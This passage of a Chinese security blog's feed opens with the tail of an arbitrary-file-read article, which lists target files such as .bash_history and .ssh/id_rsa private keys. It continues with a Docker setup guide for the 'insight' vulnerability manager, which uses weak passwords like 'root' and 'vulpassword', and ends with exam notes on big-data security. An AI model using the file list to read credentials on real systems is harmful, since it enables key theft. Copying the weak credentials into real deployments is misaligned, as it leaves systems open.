session目录</p></li><li><p>[user]/.bash_history        （历史执行命令）</p></li><li><p>[user]/.bashrc                 （部分环境变量）</p></li><li><p>[user]/.ssh/id_rsa(.pub)  （ssh登录私钥/公钥）</p></li><li><p>[user]/.viminfo                 （vim使用记录）</p><p>用户目录</p></li></ul>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h1&gt;&lt;p&gt;忙于换工作，又不知道写啥，又弃更了一段时间，看了Nu1l战队编写的从0到1 CTFER成长之路，于是记录下任意文件读取来凑个数吧。&lt;/p&gt;
&lt;h1 id=&quot;0x02-任意文件读取产生的原因&quot;&gt;&lt;a href=&quot;#0x02-任意文件读取产生的原因&quot; class=&quot;headerlink&quot; title=&quot;0x02 任意文件读取产生的原因&quot;&gt;&lt;/a&gt;0x02 任意文件读取产生的原因&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;开发者调用API时，未明确可接受的参数范围，并未对参数进行限制。&lt;/li&gt;
&lt;li&gt;Web Server自身问题或不安全的服务器配置&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="漏洞分析" scheme="https://fl4g.cn/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="文件读取" scheme="https://fl4g.cn/tags/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
    
  </entry>
  
  <entry>
    <title>漏洞管理平台insight安装使用体验</title>
    <link href="https://fl4g.cn/2020/10/27/%E6%BC%8F%E6%B4%9E%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0insight%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E4%BD%93%E9%AA%8C/"/>
    <id>https://fl4g.cn/2020/10/27/%E6%BC%8F%E6%B4%9E%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0insight%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E4%BD%93%E9%AA%8C/</id>
    <published>2020-10-27T02:37:32.000Z</published>
    <updated>2020-10-27T04:54:46.780Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-insight"><a href="#0x01-insight" class="headerlink" title="0x01 insight"></a>0x01 insight</h1><p>项目地址：<a href="https://github.com/creditease-sec/insight">宜信洞察</a></p><p>功能：</p><ul><li>应用系统资产管理</li><li>漏洞生命周期管理</li><li>安全知识库管理</li></ul><a id="more"></a><h1 id="0x02-部署安装"><a href="#0x02-部署安装" class="headerlink" title="0x02 部署安装"></a>0x02 部署安装</h1><p>参考项目提供的<a href="https://github.com/creditease-sec/insight/blob/open-source/docs/install.md">docker部署指南</a></p><p>本人使用centos7进行docker部署，yum更新完成后，开始部署。</p><h2 id="部署和启动mysql"><a href="#部署和启动mysql" class="headerlink" title="部署和启动mysql"></a>部署和启动mysql</h2><p>使用docker部署mysql，docker名称为open_source_mysqldb ，密码为root</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker pull mysql:5.7.13</span><br><span class="line"></span><br><span class="line">docker run -d -p 127.0.0.1:6606:3306 \</span><br><span class="line">--name open_source_mysqldb \</span><br><span class="line">-e MYSQL_ROOT_PASSWORD&#x3D;root \</span><br><span class="line">mysql:5.7.13</span><br></pre></td></tr></table></figure><h2 id="创建数据库和账号权限配置"><a href="#创建数据库和账号权限配置" class="headerlink" title="创建数据库和账号权限配置"></a>创建数据库和账号权限配置</h2><p>本地安装mysql客户端后直接使用如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ mysql -h 127.0.0.1 -P 6606 -u root -p</span><br><span class="line">Enter password:root</span><br><span class="line"></span><br><span class="line">mysql&gt; CREATE DATABASE IF NOT EXISTS vuldb DEFAULT CHARSET utf8 COLLATE utf8_general_ci;</span><br><span class="line">mysql&gt; grant all on vuldb.* to vuluser@&#39;%&#39; identified by &#39;vulpassword&#39;;</span><br><span class="line">mysql&gt; flush privileges;</span><br><span class="line">mysql&gt; quit</span><br></pre></td></tr></table></figure><p>或者可以先进入docker容器中，再连接mysql数据库，使用如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it open_source_mysqldb bash</span><br><span class="line"></span><br><span class="line">mysql -u root -p</span><br><span class="line">Enter password:root</span><br><span class="line"></span><br><span class="line">mysql&gt; CREATE DATABASE IF NOT EXISTS vuldb DEFAULT CHARSET utf8 COLLATE utf8_general_ci;</span><br><span class="line">mysql&gt; grant all on vuldb.* to vuluser@&#39;%&#39; identified by &#39;vulpassword&#39;;</span><br><span class="line">mysql&gt; flush privileges;</span><br><span class="line">mysql&gt; quit</span><br></pre></td></tr></table></figure><h2 id="部署APP"><a href="#部署APP" class="headerlink" title="部署APP"></a>部署APP</h2><h3 id="1-下载源码"><a href="#1-下载源码" class="headerlink" title="1. 下载源码"></a>1. 下载源码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https:&#x2F;&#x2F;github.com&#x2F;creditease-sec&#x2F;insight.git</span><br></pre></td></tr></table></figure><h3 id="2-修改srcpm-config-py-配置文件（若使用qq邮箱进行发件，见邮箱配置-jump-）"><a href="#2-修改srcpm-config-py-配置文件（若使用qq邮箱进行发件，见邮箱配置-jump-）" class="headerlink" title="2. 修改srcpm/config.py 配置文件（若使用qq邮箱进行发件，见邮箱配置](#jump)）"></a>2. 修改srcpm/config.py 配置文件（若使用qq邮箱进行发件，见邮箱配置](#jump)）</h3><ul><li>修改公司邮箱后缀</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#公司邮箱后缀限制，只能使用公司邮箱注册账号。</span><br><span class="line">CORP_MAIL &#x3D; &#39;@qq.com&#39;</span><br></pre></td></tr></table></figure><ul><li>修改邮件CC抄送列表</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#平台发送的每封邮件的邮件抄送列表，可以设置发送给安全部邮箱列表，可自行修改，也可以保持不变为空</span><br><span class="line">    &#39;&#39;&#39;</span><br><span class="line">    示例：</span><br><span class="line">    CC_EMAIL &#x3D; [&#39;xxx1@creditease.cn&#39;,</span><br><span class="line">                &#39;xxx2@creditease.cn&#39;,</span><br><span class="line">            ]</span><br><span class="line">    &#39;&#39;&#39;</span><br><span class="line">    CC_EMAIL &#x3D; [</span><br><span class="line">            ]</span><br></pre></td></tr></table></figure><ul><li>修改开发模式的邮箱服务器和发件邮箱配置</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 以开发模式的配置运行，使用测试邮件服务器，并开启debug模式</span><br><span class="line"></span><br><span class="line">    # 平台发邮件账号设置</span><br><span class="line">    SRCPM_MAIL_SENDER &#x3D; &#39;安全部 &lt;sec_creditease@sina.com&gt;&#39;</span><br><span class="line">    </span><br><span class="line">    # 发送邮件的服务器设置，邮箱密码由系统变量中读取</span><br><span class="line">    MAIL_SERVER &#x3D; &#39;smtp.sina.com&#39;</span><br><span class="line">    MAIL_PORT &#x3D; 587</span><br><span class="line">    MAIL_USE_TLS &#x3D; True</span><br><span class="line">    MAIL_USERNAME &#x3D; os.environ.get(</span><br><span class="line">        &#39;MAIL_USERNAME&#39;) or &#39;sec_creditease@sina.com&#39;</span><br><span class="line">    MAIL_PASSWORD &#x3D; os.environ.get(&#39;MAIL_PASSWORD&#39;) or &#39;&#39;</span><br></pre></td></tr></table></figure><ul><li>修改生产模式的邮箱服务器和发件邮箱配置</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 以生产模式的配置运行，使用生产邮件服务器，并关闭debug模式</span><br><span class="line"></span><br><span class="line">    # 平台发邮件账号设置</span><br><span class="line">    SRCPM_MAIL_SENDER &#x3D; &#39;安全部 &lt;xxx@creditease.cn&gt;&#39;</span><br><span class="line">    </span><br><span class="line">    # 发送邮件的服务器设置，账号密码由系统变量中读取</span><br><span class="line">    MAIL_SERVER &#x3D; &#39;x.x.x.x&#39;</span><br><span class="line">    MAIL_PORT &#x3D; 25</span><br><span class="line">    MAIL_USE_TLS &#x3D; False</span><br><span class="line">    MAIL_USERNAME &#x3D; os.environ.get(</span><br><span class="line">        &#39;MAIL_USERNAME&#39;) or &#39;xxx@creditease.cn&#39;</span><br><span class="line">    MAIL_PASSWORD &#x3D; os.environ.get(&#39;MAIL_PASSWORD&#39;) or &#39;&#39;</span><br></pre></td></tr></table></figure><h3 id="3-修改定时周期邮件-mail-sender-py-的配置"><a href="#3-修改定时周期邮件-mail-sender-py-的配置" class="headerlink" title="3. 修改定时周期邮件 mail_sender.py 的配置"></a>3. 修改定时周期邮件 mail_sender.py 的配置</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#平台发送的每封邮件的邮件抄送列表，可以设置发送给安全部邮箱列表，可自行修改，也可以保持不变为空</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">示例：</span><br><span class="line">CC_EMAIL &#x3D; [&#39;xxx1@creditease.cn&#39;,</span><br><span class="line">            &#39;xxx2@creditease.cn&#39;,</span><br><span class="line">        ]</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">CC_EMAIL &#x3D; [</span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#主机名设置</span><br><span class="line">SERVER_NAME &#x3D; &#39;xxx.creditease.corp&#39;</span><br><span class="line"></span><br><span class="line"># 平台发邮件账号设置</span><br><span class="line">SRCPM_MAIL_SENDER &#x3D; &#39;安全部 &lt;xxx@creditease.cn&gt;&#39;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 发送邮件的服务器设置，账号密码由系统变量中读取</span><br><span class="line">MAIL_SERVER &#x3D; &#39;x.x.x.x&#39;</span><br><span class="line">MAIL_PORT &#x3D; 25</span><br><span class="line">MAIL_USE_TLS &#x3D; False</span><br><span class="line">MAIL_USERNAME &#x3D; os.environ.get(</span><br><span class="line">    &#39;MAIL_USERNAME&#39;) or &#39;xxx@creditease.cn&#39;</span><br><span class="line">MAIL_PASSWORD &#x3D; os.environ.get(&#39;MAIL_PASSWORD&#39;) or &#39;&#39;</span><br></pre></td></tr></table></figure><h3 id="4-修改srcpm-app-src-forms-py-漏洞来源下拉列表"><a href="#4-修改srcpm-app-src-forms-py-漏洞来源下拉列表" class="headerlink" title="4. 修改srcpm/app/src/forms.py 漏洞来源下拉列表"></a>4. 修改srcpm/app/src/forms.py 漏洞来源下拉列表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;&#39; 下拉选项 &#39;&#39;&#39;</span><br><span class="line">source_choices &#x3D; [(&#39;&#39;,&#39;&#39;), (u&#39;安全部&#39;, u&#39;安全部&#39;), (u&#39;YISRC&#39;, u&#39;YISRC&#39;), (u&#39;公众平台&#39;, u&#39;公众平台&#39;), (u&#39;合作伙伴&#39;, u&#39;合作伙伴&#39;)]</span><br></pre></td></tr></table></figure><h2 id="邮箱配置"><a href="#邮箱配置" class="headerlink" title="邮箱配置"></a><span id="jump">邮箱配置</span></h2><p>参考<a href="https://note.youdao.com/ynoteshare1/index.html?id=885afcf3ceece652749bc1d9a55f722e&amp;type=note#/">洞察-漏洞管理系统安装</a></p><ul><li>修改srcpm/config.py 配置文件</li></ul><p><img src="/2020/10/27/%E6%BC%8F%E6%B4%9E%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0insight%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E4%BD%93%E9%AA%8C/邮箱配置1.png" alt></p><ul><li><p>修改srcpm/mail_sender.py文件</p><p><img src="/2020/10/27/%E6%BC%8F%E6%B4%9E%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0insight%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E4%BD%93%E9%AA%8C/邮箱配置2.png" alt></p><p><img src="/2020/10/27/%E6%BC%8F%E6%B4%9E%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0insight%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E4%BD%93%E9%AA%8C/邮箱配置3.png" alt="邮箱配置3"></p><ul><li><p>QQ邮箱授权码获取（下一步启动APP时的密码）</p><p>授权码作为邮箱服务器的密码，下一步启动时填入MAIL_PASSWORD中</p><p>开启QQ邮箱转发功能，并生成用于第三方登录的授权码</p><p><img src="/2020/10/27/%E6%BC%8F%E6%B4%9E%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0insight%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E4%BD%93%E9%AA%8C/qq邮箱授权码.png" alt></p></li></ul></li></ul><h2 id="在项目根目录下部署和启动APP"><a href="#在项目根目录下部署和启动APP" class="headerlink" title="在项目根目录下部署和启动APP"></a>在项目根目录下部署和启动APP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># 拉取镜像</span><br><span class="line">docker pull daocloud.io&#x2F;liusheng&#x2F;vulpm_docker:latest</span><br><span class="line">或</span><br><span class="line">自己构建镜像</span><br><span class="line">docker build -t&#x3D;&#39;vulpm_docker&#39; .</span><br><span class="line"></span><br><span class="line"># 在项目目录下启动容器，确保当前目录下存在srcpm文件夹，MAIL_PASSOWRD替换为自己邮箱服务器的密码。</span><br><span class="line">$ docker run -d -p 0.0.0.0:9000:5000 \</span><br><span class="line">--link open_source_mysqldb:db \</span><br><span class="line">--name open_source_srcpm \</span><br><span class="line">-v $PWD&#x2F;srcpm:&#x2F;opt&#x2F;webapp&#x2F;srcpm \</span><br><span class="line">-e DEV_DATABASE_URL&#x3D;&#39;mysql:&#x2F;&#x2F;vuluser:vulpassword@db&#x2F;vuldb&#39; \</span><br><span class="line">-e SrcPM_CONFIG&#x3D;development \</span><br><span class="line">-e MAIL_PASSWORD&#x3D;&#39;xxxxxx&#39; \</span><br><span class="line">daocloud.io&#x2F;liusheng&#x2F;vulpm_docker:latest \</span><br><span class="line">sh -c &#39;supervisord -c srcpm&#x2F;supervisor.conf &amp;&amp; supervisorctl -c srcpm&#x2F;supervisor.conf start all &amp;&amp; tail -f srcpm&#x2F;log&#x2F;gunicorn.err &amp;&amp; tail -f srcpm&#x2F;log&#x2F;mail_sender.err&#39;</span><br></pre></td></tr></table></figure><p><strong>注意命令中的IP地址设置成0.0.0.0，若为127.0.0.1则为本地访问。</strong></p><p>如果之前有运行过此命令的话，使用如下命令查看open_source_srcpm容器中的环境变量是否正确，注意MAIL_PASSWORD值是否为QQ邮箱授权码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec open_source_srcpm env</span><br></pre></td></tr></table></figure><p><img src="/2020/10/27/%E6%BC%8F%E6%B4%9E%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0insight%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E4%BD%93%E9%AA%8C/docker环境变量.png" alt></p><p>若不正确请先删除容器。</p><p>命令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker stop open_source_srcpm </span><br><span class="line"></span><br><span class="line">docker rm open_source_srcpm</span><br></pre></td></tr></table></figure><p>再重新运行启动命令</p><h2 id="初始化数据库"><a href="#初始化数据库" class="headerlink" title="初始化数据库"></a>初始化数据库</h2><p>数据库初始化详细配置请见：</p><p><a href="https://github.com/creditease-sec/insight/blob/open-source/docs/db_init.md">数据库初始化详细配置指南</a></p><p>或者</p><p>直接导入初始化的sql，本人使用直接导入初始化sql的方案</p><blockquote><p>导入sql</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ mysql -h127.0.0.1 -P6606 -uroot -p vuldb &lt; srcpm&#x2F;vuldb_init.sql</span><br><span class="line">Enter password:root</span><br></pre></td></tr></table></figure><h2 id="访问洞察"><a href="#访问洞察" class="headerlink" title="访问洞察"></a>访问洞察</h2><h3 id="1-主页"><a href="#1-主页" class="headerlink" title="1. 主页"></a>1. 主页</h3><p><a href="http://IP:9000/srcpm/">http://IP:9000/srcpm/</a></p><p><img src="/2020/10/27/%E6%BC%8F%E6%B4%9E%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0insight%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E4%BD%93%E9%AA%8C/主页.png" style="zoom:50%;"></p><h3 id="2-登录页面"><a href="#2-登录页面" class="headerlink" title="2. 登录页面"></a>2. 登录页面</h3><p><a href="http://IP:9000/srcpm/auth/login">http://IP:9000/srcpm/auth/login</a></p><div class="table-container"><table><thead><tr><th style="text-align:center">账号</th><th style="text-align:center">密码</th></tr></thead><tbody><tr><td style="text-align:center">admin@admin.com</td><td style="text-align:center">11</td></tr></tbody></table></div><h1 id="0x03-使用体验"><a href="#0x03-使用体验" class="headerlink" title="0x03 使用体验"></a>0x03 使用体验</h1><h2 id="漏洞管理"><a href="#漏洞管理" class="headerlink" title="漏洞管理"></a>漏洞管理</h2><p>登录后提交漏洞</p><p><img src="/2020/10/27/%E6%BC%8F%E6%B4%9E%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0insight%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E4%BD%93%E9%AA%8C/漏洞管理.png" style="zoom:50%;"></p><p>对漏洞进行管理，发送邮件给安全管理员,进行通知。</p><p><img src="/2020/10/27/%E6%BC%8F%E6%B4%9E%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0insight%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E4%BD%93%E9%AA%8C/邮件通知.png" style="zoom:50%;"></p><p>若要忽略漏洞，需使用管理员账户进行管理编辑，修改为暂不处理</p><p><img src="/2020/10/27/%E6%BC%8F%E6%B4%9E%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0insight%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E4%BD%93%E9%AA%8C/暂不处理.png" style="zoom:50%;"></p><h2 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h2><p>在管理员后台-认证和授权-用户查看处，可对注册用户与人员管理处增加对人员进行关联，通常使用同一邮箱的人会自动进行关联。</p><p><img src="/2020/10/27/%E6%BC%8F%E6%B4%9E%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0insight%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E4%BD%93%E9%AA%8C/人员关联.png" style="zoom:50%;"></p><p>匿名用户问题</p><p><a href="https://note.youdao.com/ynoteshare1/index.html?id=885afcf3ceece652749bc1d9a55f722e&amp;type=note#/">洞察-漏洞管理系统安装</a>给出解决方案</p><p><img src="/2020/10/27/%E6%BC%8F%E6%B4%9E%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0insight%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E4%BD%93%E9%AA%8C/匿名用户.png" style="zoom:50%;"></p><h2 id="缺陷"><a href="#缺陷" class="headerlink" title="缺陷"></a>缺陷</h2><p>无法进行人员和资产批量导入，不过个人觉得可以直接操作数据库进行导入。</p><h1 id="0x04-参考文章"><a href="#0x04-参考文章" class="headerlink" title="0x04 参考文章"></a>0x04 参考文章</h1><p><a href="https://note.youdao.com/ynoteshare1/index.html?id=885afcf3ceece652749bc1d9a55f722e&amp;type=note#/">洞察-漏洞管理系统安装</a></p><p><a href="https://github.com/creditease-sec/insight/blob/open-source/docs/install.md">docker部署指南</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;0x01-insight&quot;&gt;&lt;a href=&quot;#0x01-insight&quot; class=&quot;headerlink&quot; title=&quot;0x01 insight&quot;&gt;&lt;/a&gt;0x01 insight&lt;/h1&gt;&lt;p&gt;项目地址：&lt;a href=&quot;https://github.com/creditease-sec/insight&quot;&gt;宜信洞察&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;功能：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;应用系统资产管理&lt;/li&gt;
&lt;li&gt;漏洞生命周期管理&lt;/li&gt;
&lt;li&gt;安全知识库管理&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="工具使用" scheme="https://fl4g.cn/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
    
    <category term="insight" scheme="https://fl4g.cn/tags/insight/"/>
    
  </entry>
  
  <entry>
    <title>第26章 大数据安全需求分析与安全保护工程</title>
    <link href="https://fl4g.cn/2020/09/29/%E7%AC%AC26%E7%AB%A0-%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90%E4%B8%8E%E5%AE%89%E5%85%A8%E4%BF%9D%E6%8A%A4%E5%B7%A5%E7%A8%8B/"/>
    <id>https://fl4g.cn/2020/09/29/%E7%AC%AC26%E7%AB%A0-%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90%E4%B8%8E%E5%AE%89%E5%85%A8%E4%BF%9D%E6%8A%A4%E5%B7%A5%E7%A8%8B/</id>
    <published>2020-09-29T08:02:09.000Z</published>
    <updated>2020-09-29T08:31:33.440Z</updated>
    
    <content type="html"><![CDATA[<h1 id="大数据安全威胁与需求分析"><a href="#大数据安全威胁与需求分析" class="headerlink" title="大数据安全威胁与需求分析"></a>大数据安全威胁与需求分析</h1><h2 id="大数据安全威胁分析"><a href="#大数据安全威胁分析" class="headerlink" title="大数据安全威胁分析"></a>大数据安全威胁分析</h2><p>安全挑战：</p><ol><li><p>“数据集”安全边界日渐模糊，安全保护难度提升</p></li><li><p>敏感数据泄露安全风险增大</p></li><li><p>数据失真与大数据污染安全风险</p></li><li><p>大数据处理平台业务连续性与拒绝服务</p><a id="more"></a></li><li><p>个人数据广泛分布于多个数据平台，隐私保护难度加大</p></li><li><p>数据交易安全风险</p></li><li><p>大数据滥用</p></li></ol><h2 id="大数据安全法规政策"><a href="#大数据安全法规政策" class="headerlink" title="大数据安全法规政策"></a>大数据安全法规政策</h2><ol><li>《气象资料共享管理办法》</li><li>《中国人民银行关于银行业金融机构做好个人金融信息保护工作的通知》</li><li>《全国人民代表大会常务委员会关于加强网络信息保护的决定》</li><li>《电信和互联网用户个人信息保护规定》</li><li>《中华人民共和国消费者权益保护法（2013修正）》</li><li>《地图管理条例》</li><li>《中华人民共和国网络安全法》</li><li>《网络预约出租汽车经营服务管理暂行办法》</li><li>《网络出版服务管理规定》</li><li>《人口健康信息管理办法（试行）》</li><li>《保险公司开业验收指引》</li><li>《保险机构信息化监管规定（征求意见稿）》</li></ol><p>欧盟颁布实施《一般数据保护法案》（GDPR）</p><h2 id="大数据安全需求分析"><a href="#大数据安全需求分析" class="headerlink" title="大数据安全需求分析"></a>大数据安全需求分析</h2><p>主要内容：</p><ol><li>大数据自身安全：大数据应用依赖于可信的数据</li><li>大数据安全合规：满足不同国家和地区</li><li>大数据跨境安全：主要包括数据物理存储位置、跨境数据流动安全要求等</li><li>大数据隐私保护</li><li>大数据处理平台安全</li><li>大数据业务安全</li><li>大数据安全运营</li></ol><h1 id="大数据安全保护机制与技术方案"><a href="#大数据安全保护机制与技术方案" class="headerlink" title="大数据安全保护机制与技术方案"></a>大数据安全保护机制与技术方案</h1><h2 id="大数据安全保护机制"><a href="#大数据安全保护机制" class="headerlink" title="大数据安全保护机制"></a>大数据安全保护机制</h2><p>基本安全机制：数据分类分级、数据源认证、数据溯源、数据用户标识和鉴别、数据资源访问控制、数据隐私保护、数据备份与恢复、数据安全审计与监测、数据安全管理</p><h2 id="大数据自身安全保护技术"><a href="#大数据自身安全保护技术" class="headerlink" title="大数据自身安全保护技术"></a>大数据自身安全保护技术</h2><p>数字签名验证数据来源真实性；Hash算法确保数据完整性；加密算法保护数据机密性</p><h2 id="大数据平台安全保护技术"><a href="#大数据平台安全保护技术" class="headerlink" title="大数据平台安全保护技术"></a>大数据平台安全保护技术</h2><p>安全技术：安全分区、防火墙、系统安全加固、数据防泄漏</p><h2 id="大数据业务安全保护技术"><a href="#大数据业务安全保护技术" class="headerlink" title="大数据业务安全保护技术"></a>大数据业务安全保护技术</h2><p>安全内容：</p><ul><li>业务授权：基于角色的访问控制技术</li><li>业务逻辑安全：针对业务流程进行安全控制</li><li>业务合规性：业务满足政策法规及安全标准规范要求，技术有名贵数据安全检查、系统安全配置基准数据监控</li></ul><h2 id="大数据隐私安全保护技术"><a href="#大数据隐私安全保护技术" class="headerlink" title="大数据隐私安全保护技术"></a>大数据隐私安全保护技术</h2><p>主要技术：数据身份匿名、数据差分隐私、数据脱敏、数据加密、数据访问控制</p><h2 id="大数据运营安全保护技术"><a href="#大数据运营安全保护技术" class="headerlink" title="大数据运营安全保护技术"></a>大数据运营安全保护技术</h2><p>常用技术：网络入侵监测、网络安全态势感知、网络攻击取证、网络威胁情报分析、安全堡垒机</p><h2 id="大数据安全标准规范"><a href="#大数据安全标准规范" class="headerlink" title="大数据安全标准规范"></a>大数据安全标准规范</h2><ul><li>《信息安全技术 个人信息安全规范》</li><li>《信息安全技术 的数据服务安全能力要求》</li><li>《信息安全技术 大数据安全管理指南》</li><li>《信息安全技术 数据交易服务安全要求》</li><li>《信息安全技术 个人信息去标识化指南》</li></ul><h1 id="大数据综合应用案例分析"><a href="#大数据综合应用案例分析" class="headerlink" title="大数据综合应用案例分析"></a>大数据综合应用案例分析</h1><p>阿里巴巴大数据安全实践、京东大数据安全实践、上海数据交易中心安全保护、华为大数据安全实践、科学数据安全管理、支付卡行业数据安全规范详见P562-P568</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;大数据安全威胁与需求分析&quot;&gt;&lt;a href=&quot;#大数据安全威胁与需求分析&quot; class=&quot;headerlink&quot; title=&quot;大数据安全威胁与需求分析&quot;&gt;&lt;/a&gt;大数据安全威胁与需求分析&lt;/h1&gt;&lt;h2 id=&quot;大数据安全威胁分析&quot;&gt;&lt;a href=&quot;#大数据安全威胁分析&quot; class=&quot;headerlink&quot; title=&quot;大数据安全威胁分析&quot;&gt;&lt;/a&gt;大数据安全威胁分析&lt;/h2&gt;&lt;p&gt;安全挑战：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;“数据集”安全边界日渐模糊，安全保护难度提升&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;敏感数据泄露安全风险增大&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;数据失真与大数据污染安全风险&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;大数据处理平台业务连续性与拒绝服务&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;</summary>
    
    
    
    <category term="信息安全工程师软考" scheme="https://fl4g.cn/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E8%BD%AF%E8%80%83/"/>
    
    
